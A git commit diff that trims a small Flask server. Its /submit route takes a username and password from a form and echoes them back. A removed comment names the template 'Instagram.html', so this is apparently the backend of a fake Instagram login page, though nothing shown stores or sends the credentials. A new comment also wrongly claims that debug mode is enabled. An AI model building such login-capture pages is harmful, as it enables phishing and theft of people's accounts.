3f5c2f4019078cb7ffb8e592b92b6453d6c30ec9
jhonmerk <jhonmerk@proton.me>
2024-10-25 22:09:41 +0000

    Update flask_server.py

--- api/flask_server.py
+++ api/flask_server.py
@@ -1,21 +1,16 @@
-from flask import Flask, request, render_template  # Asegúrate de importar render_template
-import os
+from flask import Flask, request, render_template
 
 app = Flask(__name__)
 
 @app.route('/')
 def index():
-    try:
-        return render_template('index.html')  # Asegúrate de que Instagram.html esté en la carpeta templates
-    except Exception as e:
-        return str(e), 500
+    return render_template('index.html')  # Verifica que 'index.html' está en la carpeta 'templates'
 
 @app.route('/submit', methods=['POST'])
 def submit():
     username = request.form['username']
     password = request.form['password']
-    # print(f"Nombre: {username}, Contraseña: {password}")
     return f"Datos recibidos: {username}, Contraseña: {password}"
 
 if __name__ == '__main__':
-   app.run()
+    app.run()  # Habilita el modo de depuración
